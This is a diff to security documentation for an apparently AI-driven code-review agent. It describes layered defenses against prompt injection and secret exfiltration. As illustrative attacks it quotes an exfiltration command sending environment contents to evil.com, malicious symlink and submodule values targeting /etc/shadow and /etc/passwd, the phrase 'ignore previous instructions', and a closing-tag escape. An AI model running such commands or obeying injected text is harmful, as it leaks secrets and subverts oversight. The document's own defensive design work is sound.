@@ -36,11 +36,66 @@ The following mechanisms limit the impact of a successful prompt injection:
 
 - **Bash command allowlisting** — bash commands are checked against `fnmatch` patterns before execution. Commands that don't match an allowed pattern are rejected with an error.
 
+- **Shell injection blocking** — when bash patterns are active, commands are validated against a blocklist of shell metacharacters (`$`, `` ` ``, `|`, `;`, `&`) and dangerous builtins (`eval`, `exec`, `source`). This prevents attacks like `git clone https://evil.com/$(cat /proc/self/environ)` that would pass the fnmatch allowlist but exfiltrate secrets via shell expansion.
+
+- **Git clone host validation** — `git clone` commands are restricted to known hostnames (default: `github.com`, `gitlab.com`). Clones targeting unknown hosts are rejected, preventing data exfiltration to attacker-controlled servers. The allowlist is configurable via `allowed_clone_hosts` for self-hosted instances.
+
+- **Git clone hardening** — all `git clone` and `git fetch` operations are hardened with three config overrides that prevent malicious repositories from executing code during checkout:
+    - `core.hooksPath=/dev/null` — disables all git hooks (`post-checkout`, `post-merge`, `pre-commit`, etc.), preventing a repo from executing arbitrary shell scripts via hook files.
+    - `core.symlinks=false` — git creates regular files instead of symlinks, preventing a repo from planting a symlink like `config.py -> /etc/shadow` that escapes the workspace directory.
+    - `protocol.file.allow=never` — blocks the `file://` protocol in submodules, preventing `.gitmodules` entries like `url = file:///etc/passwd` from reading arbitrary local files during submodule initialization.
+
+- **Environment sanitization** — subprocess tools (`Bash`, `Grep`) run with a sanitized environment containing only safe variables (`PATH`, `HOME`, `LANG`, etc.). Secrets like `GITLAB_TOKEN`, `REDIS_URL`, and API keys are stripped from the subprocess environment using an allowlist approach. This is the primary defense against secret exfiltration via tool execution.
+
+- **Output sanitization** — all tool outputs are scanned for known secret patterns (GitLab PATs, GitHub PATs, OpenAI keys, Google API keys, private keys, bearer tokens) and redacted with `[REDACTED]` before being returned to the LLM. Review output (summaries and inline comments) is also sanitized before being posted to the platform, preventing the LLM from embedding leaked secrets in PR comments.
+
+- **Prompt boundary tags** — untrusted content (diffs, comments, user prompts, file paths, branch names) is wrapped in XML boundary tags (`<untrusted-diff>`, `<untrusted-comment>`, etc.) before insertion into LLM prompts. The system prompt includes anchoring instructions that tell the LLM to treat tagged content as opaque data, not as instructions to follow.
+
 - **`ALLOWED_USERS` gating** — only users listed in `ALLOWED_USERS` can trigger the agent via comments. Unauthorized users are silently ignored, preventing external actors from directly prompting the agent.
 
 - **Turn and token caps** — `AGENT_MAX_TURNS` limits the number of agent loop iterations, and `MAX_RESPONSE_TOKENS` (16,384) caps each LLM response. These prevent runaway agent loops.
 
 - **Diff line validation** — review findings are validated against the actual diff. Findings that reference lines outside the diff are filtered out and appended to the summary instead.
+
+### Prompt Boundary Tags
+
+All untrusted content inserted into LLM prompts is wrapped in XML
+boundary tags that mark data boundaries. The system prompt includes
+anchoring instructions telling the LLM to treat tagged content as data
+only, not as instructions.
+
+| Tag | Content | Source |
+|-----|---------|--------|
+| `<untrusted-diff>` | PR patch | `_build_reviewer_prompt` |
+| `<untrusted-comment>` | Existing comment bodies | `_format_existing_comments` |
+| `<untrusted-request>` | User mention prompt | Both prompt builders |
+| `<untrusted-hunk>` | Diff hunk context | `_build_prompt` (worker) |
+| `<file-path>` | File paths | Both prompt builders |
+| `<branch-name>` | PR branch name | Both prompt builders |
+| `<repo-guidelines>` | Repo guidelines | `resolve_system_prompt` |
+
+#### Attacks mitigated
+
+- **Direct instruction injection** — malicious text in diffs or
+  comments that says "ignore previous instructions" is clearly
+  inside a data boundary, making the LLM far less likely to follow it.
+- **Role impersonation** — content pretending to be system prompt
+  text (e.g. "## New Instructions") is enclosed in a tag the system
+  prompt explicitly marks as untrusted data.
+- **Context escape** — without boundaries, carefully placed markdown
+  (e.g. closing a code fence then adding instructions) can blend into
+  the surrounding prompt. XML tags create a stronger delimiter that
+  is harder to escape from.
+
+#### Limitations
+
+Boundary tags are a defense-in-depth measure, not a guarantee. A
+determined attacker can still embed closing tags (e.g.
+`</untrusted-diff>`) inside content. The anchoring instructions
+in the system prompt are the secondary defense for this case.
+Combined with tool restrictions, environment sanitization, and
+output redaction, boundary tags significantly raise the bar for
+successful prompt injection.
 
 ### Recommendations
 
@@ -130,10 +185,55 @@ PR lifecycle events (open, push, reopen, ready-for-review) configured in `REVIEW
 | Capability | Reviewer Bot | Worker Bot |
 |------------|-------------|------------|
 | **Available tools** | `Read`, `Glob`, `Grep`, `Bash(git clone*)` | All tools |
-| **Bash commands** | Only `git clone*` (fnmatch) | Unrestricted |
+| **Bash commands** | Only `git clone*` (fnmatch) + shell injection check | Unrestricted |
+| **Git clone hosts** | `github.com`, `gitlab.com` (configurable) | Configurable |
+| **Subprocess environment** | Sanitized (allowlisted vars only) | Sanitized (allowlisted vars only) |
+| **Output sanitization** | Secret patterns redacted | Secret patterns redacted |
 | **Permission mode** | `bypassPermissions` (with tool allowlist) | `bypassPermissions` (no allowlist) |
 | **Can modify files** | No | Yes |
 | **Can push code** | No | Yes |
+
+## Defense-in-Depth Architecture
+
+Secret leakage prevention is implemented across four layers. Each layer is independent — even if one layer is bypassed, the others continue to protect against exfiltration.
+
+### Layer 1: Environment Sanitization
+
+The `build_sanitized_env()` function in `nominal_code/agent/sandbox.py` filters `os.environ` using an **allowlist** of safe variable names:
+
+```
+PATH, HOME, LANG, LC_ALL, TERM, TMPDIR, USER, LOGNAME, SHELL
+```
+
+All subprocess tools (`Bash`, `Grep`) receive this filtered environment via the `env=` parameter on `asyncio.create_subprocess_exec`. Secrets like `GITLAB_TOKEN`, `REDIS_URL`, `ANTHROPIC_API_KEY`, and `ENCRYPTION_KEY` are never present in the subprocess.
+
+The allowlist can be extended via `extra_safe_vars` for specific use cases.
+
+### Layer 2: Shell Injection Blocking
+
+When bash patterns are active (i.e., the reviewer bot), commands are validated before execution:
+
+1. **Metacharacter check** — a regex blocks `$`, `` ` ``, `|`, `;`, `&`, and builtins `eval`/`exec`/`source`. This prevents shell expansion attacks that could read environment variables or chain commands.
+
+2. **Clone host validation** — for `git clone` commands, the target URL hostname is parsed and checked against an allowlist. Both HTTPS and SSH-style (`git@host:path`) URLs are supported.
+
+### Layer 3: Output Sanitization
+
+The `sanitize_output()` function scans text for known secret patterns and replaces matches with `[REDACTED]`:
+
+| Pattern | Example |
+|---------|---------|
+| GitLab PAT | `glpat-...` |
+| GitHub PAT / App token | `ghp_...`, `ghs_...` |
+| OpenAI key | `sk-...` |
+| Google API key | `AIza...` |
+| Private keys | `-----BEGIN RSA PRIVATE KEY-----` |
+| Bearer tokens | `Bearer eyJ...` |
+
+Output sanitization is applied at two points:
+
+- **Tool results** — before returning to the LLM (prevents the model from reasoning about secrets)
+- **Review posting** — summary and all inline comment bodies are sanitized before being submitted to GitHub/GitLab (prevents secrets appearing in PR comments)
 
 ## Secret Management
 
@@ -165,6 +265,51 @@ PR lifecycle events (open, push, reopen, ready-for-review) configured in `REVIEW
 | Webhook body size | 5 MB | Rejects oversized payloads |
 | Shallow clone depth | 1 commit | Minimizes cloned data |
 | Tool log truncation | 500 characters | Limits tool output in logs |
+
+## Kubernetes Pod Hardening
+
+When running review jobs on Kubernetes, the job runner applies security hardening to all pod specs unconditionally.
+
+### Container Security Context
+
+Every review container runs with a restricted security context:
+
+| Setting | Default | Purpose |
+|---------|---------|---------|
+| `readOnlyRootFilesystem` | `true` | Prevents writing to the container filesystem |
+| `runAsNonRoot` | `true` | Blocks running as root |
+| `runAsUser` | `1000` | Fixed UID matching the Dockerfile `nominal` user |
+| `allowPrivilegeEscalation` | `false` | Prevents gaining additional privileges |
+| `capabilities.drop` | `["ALL"]` | Drops all Linux capabilities |
+
+### Writable Volumes
+
+Since the root filesystem is read-only, two `emptyDir` volumes are mounted for workspace and temporary files:
+
+- `/workspace` — repository checkout and agent working directory
+- `/tmp` — temporary files
+
+### Non-root Docker Images
+
+All Dockerfiles create a dedicated `nominal` user (UID 1000, GID 1000) and switch to it via `USER nominal` before the entrypoint. This ensures:
+
+- **Consistent behavior across runtimes** — whether running under Kubernetes (with `runAsUser: 1000`), plain Docker, or docker-compose, the process never runs as root.
+- **No permission conflicts** — files are `chown`-ed to the `nominal` user during the build, so the non-root process can read the application and write to `/workspace` and `/tmp`.
+- **Defense-in-depth** — the image-level `USER` is the baseline. The K8s `runAsNonRoot: true` is an enforcement layer that rejects the pod if the image somehow defaults to root.
+
+### Service Account Token
+
+`automountServiceAccountToken` is set to `false` by default, preventing job pods from accessing the Kubernetes API. This blocks metadata-based attacks (e.g., reading secrets from the API server).
+
+### Network Policy (Deployment Concern)
+
+For additional isolation, deploy a Kubernetes `NetworkPolicy` that:
+
+- Blocks the cloud metadata endpoint (`169.254.169.254`)
+- Restricts egress to: LLM API provider, git hosting (`gitlab.com`/`github.com`), Redis
+- Denies all ingress to job pods
+
+This is a deployment-level configuration, not managed by the application.
 
 ## Network Exposure
 
